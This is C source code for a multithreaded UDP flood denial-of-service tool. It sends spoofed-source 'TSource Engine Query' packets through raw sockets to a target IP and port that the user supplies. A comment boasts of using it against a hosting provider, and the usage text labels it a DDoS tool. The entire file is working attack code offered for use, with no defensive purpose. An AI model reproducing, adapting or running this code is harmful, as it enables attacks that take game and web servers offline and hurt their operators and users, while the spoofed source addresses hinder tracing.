/*
        Fatti made this method hit nfos no cap
*/
 
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
 
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
 
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
 
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i] ^ Q[i] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
 
void setup_ip_header(struct iphdr *iph)
{
    char ip[17];
    snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 50;
    iph->id = htonl(rand()%65535);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 17;
    iph->check = 0;
    iph->saddr = inet_addr(ip);
}
 
void setup_udp_header(struct udphdr *udph)
{
    udph->source = htons(rand()%65535);
    udph->dest = htons(floodport);
    udph->check = 0;
    void *data = (void *)udph + sizeof(struct udphdr);
    memset(data, 0xFF, 4);
    strcpy(data+4, "TSource Engine Query");
    udph->len=htons(sizeof(struct udphdr) + 50);
}
 
void *flood(void *par1)
{
        //int class[]= {16843009, 134744072, 151587081, 2155093072, 2155093012, 2450767831, 1348198214,37384646,764308322,3247258861,763588419,755884866,755884954,3111453514,37384655,764308428,100529771};
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
       
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(floodport);

        sin.sin_addr.s_addr = inet_addr(td);
 
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
        if(s < 0){
                fprintf(stderr, "Could not open raw socket.\n");
                exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_udp_header(udph);
 
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
                exit(-1);
        }
 
        init_rand(time(NULL));
        register unsigned int i;
        i = 0;
        while(1){
                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
                //iph->saddr = htonl(class[rand_cmwc()%20]);
                iph->saddr = htonl(rand_cmwc() & 0xFFFFFFFF);
                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
                iph->check = csum ((unsigned short *) datagram, iph->tot_len);
               
                pps++;
                if(i >= limiter)
                {
                        i = 0;
                        usleep(sleeptime);
                }
                i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 5){
                fprintf(stderr, "Invalid parameters!\n");
                fprintf(stdout, "@CKDDOS-Usage: %s <target IP> <Flood Port> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
                exit(-1);
        }
 
        fprintf(stdout, "Setting up Sockets...\n");
        floodport = atoi(argv[2]);
        int num_threads = atoi(argv[3]);
        int maxpps = atoi(argv[4]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
       
        int multiplier = 100;
 
        int i;
        for(i = 0;i<num_threads;i++){
                pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        fprintf(stdout, "Starting Flood... Fatti Made This Shit... Sending Fatass Packets\n");
        for(i = 0;i<(atoi(argv[5])*multiplier);i++)
        {
                usleep((1000/multiplier)*1000);
                if((pps*multiplier) > maxpps)
                {
                        if(1 > limiter)
                        {
                                sleeptime+=100;
                        } else {
                                limiter--;
                        }
                } else {
                        limiter++;
                        if(sleeptime > 25)
                        {
                                sleeptime-=25;
                        } else {
                                sleeptime = 0;
                        }
                }
                pps = 0;
        }
 
        return 0;
}